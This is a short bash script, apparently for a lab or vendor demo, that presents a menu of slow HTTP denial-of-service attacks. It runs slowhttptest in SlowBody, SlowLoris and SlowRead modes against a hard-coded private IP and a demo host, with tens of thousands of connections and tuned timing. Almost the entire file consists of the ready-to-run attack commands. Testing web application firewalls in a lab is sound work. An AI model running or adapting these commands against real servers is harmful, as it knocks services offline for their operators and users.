#!/bin/bash

# v1.0 by sVen Mueller

clear
echo "Slow-HTTP-Tests"
echo
#IP=$1
IP="10.1.10.145"
#if [ "$IP" == "" ]
# then
#        #echo -n "Enter Target IP as an Argument"
#        #exit
#fi
SERVER="hackazon.f5demo.com"

BASELINE='Please choose your attack type: '
options=("SlowBody" "SlowLoris" "SlowRead" "Quit")
select opt in "${options[@]}"
do
        case $opt in
                "SlowBody")
			/usr/bin/slowhttptest -c 65539 -B -i 110 -r 100 -s 8192 -t FAKEVERB -u http://$IP -x 10 -p 3
			/usr/bin/slowhttptest -c 65539 -B -i 110 -r 100 -s 8192 -t POST -u http://$IP -x 10 -p 3
                ;;
                "SlowLoris")
			/usr/bin/slowhttptest -c 1000 -H -i 10 -r 200 -t GET -u http://$SERVER/index.html -x 24 -p 3
                ;;
		"SlowRead")
			/usr/bin/slowhttptest -c 1000 -X -r 1000 -w 10 -y 20 -n 5 -z 32 -u http://$SERVER/large.txt -p 5 -l 350
		;;
                "Quit")
                        break
                ;;
        *) echo invalid option;;
    esac
done
